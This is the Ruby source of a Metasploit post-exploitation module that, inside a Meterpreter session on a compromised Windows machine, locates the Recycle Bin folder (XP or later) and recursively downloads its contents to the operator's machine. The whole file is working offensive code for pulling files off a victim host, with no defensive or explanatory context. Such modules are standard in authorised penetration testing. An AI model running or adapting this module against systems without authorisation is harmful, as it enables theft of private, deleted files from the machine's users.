##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Windows Gather files',
        'Description'   => %q{ Module to recover files from the Recycle Bin },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Pablo Gonzalez'],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
      ))
  end

  def run
    if sysinfo['OS'] =~ /Windows XP/
        trash_path = 'c:\\Recycler\\'
    else
        trash_path = 'c:\\$Recycle.bin\\'
    end

    if (client.fs.dir.entries(trash_path) - %w{ . .. }).empty?
        print_status("Recycle Bin (#{trash_path}) is empty")
        return
    end

    host = client.session_host
    msf_trash = ::File.join(Msf::Config.config_directory, "Trash", host + "_" + Time.now.strftime("%Y%m%d.%M%S"))
    print_status("Downloading Trash files from #{trash_path}")
    client.fs.dir.download(msf_trash, trash_path, {"recursive" => true}, true )
    print_good("Files downloaded to #{msf_trash}")
  end
end
